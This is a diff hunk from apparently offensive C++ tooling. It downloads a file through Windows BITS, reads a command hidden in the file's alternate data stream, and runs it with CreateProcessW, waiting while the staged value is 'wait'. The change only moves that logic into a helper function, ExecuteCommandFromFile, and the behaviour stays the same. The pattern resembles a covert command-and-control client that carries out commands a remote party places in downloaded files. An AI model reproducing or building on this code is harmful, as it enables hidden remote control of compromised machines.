@@ -149,38 +149,7 @@ void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) 
         pJob->Complete();
         std::wcout << L"Download completed successfully!" << std::endl;
 
-        std::wstring filePath = localFile;  // Path to the file with the ADS
-        std::wstring command = readCommentFromFile(filePath);  // Read the command from the ADS
-
-        if (!command.empty()) {
-            std::wcout << L"Command from File: " << command << std::endl;
-
-            if (command != L"wait") {
-                // Now execute the command using CreateProcessW (if valid)
-                STARTUPINFO si = { 0 };
-                PROCESS_INFORMATION pi = { 0 };
-                si.cb = sizeof(si);
-
-                hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-                if (hr == 0) {
-                    std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
-                }
-                else {
-                    // Wait for the process to exit (optional)
-                    WaitForSingleObject(pi.hProcess, INFINITE);
-
-                    // Close handles
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                }
-            }
-            else {
-                std::wcout << L"No command yet, wainting" << std::endl;
-            }
-        }
-        else {
-            std::wcerr << L"No command found in File." << std::endl;
-        }
+        ExecuteCommandFromFile(localFile);
     }
     else {
         std::wcerr << L"BITS job ended with unexpected state: " << state << std::endl;
